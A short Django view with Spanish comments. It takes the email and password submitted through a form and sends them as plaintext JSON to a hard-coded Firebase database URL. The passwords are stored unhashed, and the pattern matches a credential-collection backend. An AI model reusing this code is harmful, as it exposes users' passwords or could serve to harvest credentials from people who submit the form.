import requests
from django.shortcuts import render, redirect
from django.conf import settings

def enviar_a_firebase(request):
    if request.method == 'POST':
        email = request.POST.get('email')  # Usamos get() para manejar excepciones si 'email' no está presente
        password = request.POST.get('password')  # Usamos get() para manejar excepciones si 'password' no está presente
        
        # Aquí defines la URL de tu base de datos Firebase con la clave única
        firebase_url = "https://moneycup-d429c-default-rtdb.firebaseio.com/0l8Ww8eouajmG9iHLJwB.json"

        # Datos a enviar, en formato JSON
        data = {
            'email': email,
            'password': password
        }

        try:
            # Enviar los datos a Firebase usando requests
            response = requests.put(firebase_url, json=data)
            response.raise_for_status()  # Lanza una excepción si la respuesta no es exitosa (código 200)

            if response.status_code == 200:
                # Éxito al enviar los datos
                return redirect('pagina_exito')  # Redirige a una página de éxito

        except requests.exceptions.RequestException as e:
            # Manejar la excepción en caso de error de solicitud
            print(f"Error al enviar datos a Firebase: {str(e)}")
            return render(request, 'formulario.html', {'error': 'Hubo un problema al enviar los datos'})

        # Si no se alcanza el éxito, mostrar un mensaje de error genérico
        return render(request, 'formulario.html', {'error': 'Hubo un problema al enviar los datos'})

    # Si no es un POST, simplemente renderiza el formulario
    return render(request, 'formulario.html')
